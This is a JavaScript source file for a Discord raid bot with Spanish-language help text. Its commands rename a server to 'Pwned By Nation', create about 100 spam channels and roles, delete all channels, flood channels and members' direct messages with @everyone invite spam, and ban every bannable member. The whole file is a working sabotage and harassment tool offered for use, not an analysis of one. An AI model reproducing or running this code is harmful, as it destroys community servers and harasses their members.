const { Client, MessageEmbed, Message  } = require("discord.js");
const client = new Client();
const config = require("./config.json");
var prefix = config.prefix;
client.on("ready", () => {
    console.log("Listo para el desmadre");
    client.user.setActivity("#Nation Motherfucker");
});
client.on("message", async message => {
    const args = message.content.slice(prefix.lenght).trim().split(/ +/g);
    const command = args.shift().toLowerCase();
    if(!message.content.startsWith(prefix)) return;
    if(message.author.bot) return;
    switch (command){
        case("!help"):
            const Menu = new MessageEmbed()
            .setTitle("**Bienvenido al Menú de Nation**")
            .setColor("#e60000")
            .setDescription("Aquí encontrarás todos los comandos del Bot con una breve descripción de lo que hace cada uno.")
            .setImage("https://media.discordapp.net/attachments/768597072613736450/770460307625738280/Nation.jpg?width=432&height=428")
            .addField("!help", "Muestra todos los comandos del Bot en un mensaje Embed.")
            .addField("!fuck","Creará 100 canales Además también cambia el ícono y el nombre del server.")
            .addField("!kill", "Enviará el Spam a todos los canales creados.")
            .addField("!blow", "Borrará todos los canales del servidor y creará uno nuevo para colocar los comandos.")
            .addField("!rolz", "Hará 100 Roles anunciando la victoria de Nation.")
            .addField("!annoy","Envia mensajes directos, a veces no funciona por el API de discord.")
            .addField("!harakiri","Banea a todos los usuarios del servidor, obviamente también te baneará a ti.")
            .addField("Próximamente...","El bot no está terminado, aproximadamente esto representa un 30%, pronto habrá mas comandos.")
            .setFooter("Bot By: Nevers0ft_#6666")
            message.channel.send(Menu);
            break;
        case("!fuck"):
            message.delete();
            message.guild.setName("Pwned By Nation Motherfucker")
            message.guild.setIcon("https://media.discordapp.net/attachments/768597072613736450/770460307625738280/Nation.jpg?width=432&height=428")
            for(i = 0; i <= 100; i++){message.guild.channels.create("raid-by-nation", {type:"text"});}
            break;
        case("!blow"):
            try{message.guild.channels.cache.forEach(channel => {channel.delete();})} catch (error){console.error(error)}
            message.guild.channels.create("raid-by-nation", {type:"text"});
            break;
        case("!kill"):
            message.guild.channels.cache.forEach(channel => {
                for(a = 0; a <= 9; a++){channel.send("@everyone Nation is here, fucker https://discord.gg/xV5BaT")}
            })
            break;
        case("!rolz"):
            for (e = 0; e <= 99; e++){message.guild.roles.create({data: {name: "NationWins", color: "RANDOM"}});}
            break;
        case("!harakiri"):
            try{message.guild.members.cache.filter(member => member.bannable).forEach(member => member.ban());}
            catch(error){console.error(error)}
            break;
        case("!annoy"):
            message.channel.guild.members.cache.forEach(user => {
                user.send("Nation wins https://discord.gg/xV5BaT");
                user.send("Bot by: Nevers0ft_#6666");
            });
            break;
    }
});
client.login(config.token);
